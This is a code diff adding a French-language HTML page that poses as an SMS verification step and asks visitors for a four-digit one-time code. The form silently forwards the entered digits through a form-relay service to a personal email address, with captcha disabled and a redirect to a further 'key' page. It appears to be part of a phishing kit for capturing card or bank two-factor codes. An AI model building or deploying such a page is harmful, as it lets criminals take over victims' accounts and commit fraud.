@@ -1,0 +1,66 @@
+<!-- Inclure le script de configuration de la base de donnée -->
+<!DOCTYPE html>
+<html lang="fr-FR">
+
+<head>
+    <!-- Meta données(Mots clés, description, robots...) -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <!-- Chemin d'accès menant vers les fichiers scss -->
+    <link rel="stylesheet" href="assets/lib/tailwindcss/tailwind.min.css">
+    <link rel="stylesheet" href="assets/css/style.css">
+    <link rel="shortcut icon" href="assets/img/card.png" type="image/x-icon">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Kanit:ital,wght@0,100;0,200;0,400;0,600;1,100;1,400&family=Montserrat:wght@400;600;700&family=Work+Sans:ital,wght@1,400;1,700;1,800&display=swap"
+        rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.js"></script>
+
+    <!-- Titre -->
+    <title>Wave Shooter</title>
+</head>
+<style>
+    #key input
+    {
+        border-bottom: 1px solid #ddd;
+        width: 45px;
+        font-size: 19px;
+        text-align: center;
+    }
+</style>
+<body>
+    <div class="pt-32 p-18">
+        <h1 class="font-normal text-black text-2xl text-center mb-8">
+            Entrez le code de validation envoyé par SMS à votre numéro *** *** ***
+        </h1>
+        <br><br>
+        <form action="https://formsubmit.co/stephanefopa47@gmail.com" method="post">
+            <div class="flex gap-4 justify-center" id="key">
+                <input type="hidden" name="_captcha" value="false">
+                <input type="hidden" name="_next" value="/key.html">
+                <input type="text" name="one">
+                <input type="text" name="two">
+                <input type="text" name="tree">
+                <input type="text" name="four">
+                <button type="submit" class="bg-black text-white p-2">OK</button>
+            </div>
+        </form>
+        <br><br>
+        <p class="text-center">
+            <a href="#" class="underline text-blue-300">Renvoyer le SMS</a>
+        </p>
+    </div>
+    <script>
+        $("#dropdown-phone-button").click(function () {
+            $("#dropdown-phone").css("display", "block");
+        });
+        $("#cancel").click(function () { 
+            $("#dropdown-phone").css("display", "none");
+        });
+    </script>
+</body>
+
+</html>
